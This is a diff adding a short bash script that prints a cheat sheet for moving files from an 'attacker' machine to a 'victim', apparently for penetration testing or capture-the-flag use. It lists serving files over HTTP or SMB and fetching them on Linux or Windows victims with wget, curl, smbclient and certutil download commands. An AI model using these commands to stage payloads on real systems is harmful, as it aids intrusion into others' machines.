@@ -1,0 +1,31 @@
+#!/bin/bash
+#
+#How to transfer it from attacker machine to victim.
+#
+#
+
+
+echo " "
+echo "$(tput setaf 2)[*]Attacker:"
+	echo "1. python3 -m http.server 80"
+	echo "2. impacket-smbserver smbFolder $(pwd) -smb2support"
+
+echo " "
+echo "[*]Linux:"
+	echo "1. Victim site --> wget http://<ip>/<resource>"
+	echo "2. Victim site --> curl http://<ip>/<resource>"
+	echo "3. Victim site --> smbclient //<ip>/smbFolder/ -N"
+echo " "
+echo "[*]Windows:"
+	echo "1. Victim site --> certutil.exe -f -urlcache -split http://<ip>/<resource>"
+	echo "2. Victim site --> certutil.exe -urlcache -split http://<ip>/<resource>"
+	echo "3. Victim site --> copy \\<ip>\<folder>\<resource> <resourceNewname>"
+echo " "
+
+
+echo " ______________________________________________________"
+echo "|                                                      |"
+echo "| Si ningún elemento superior funciona, usar: ./xClip  | "
+echo "|                                                      |"
+echo "-------------------------------------------------------"
+echo "" 
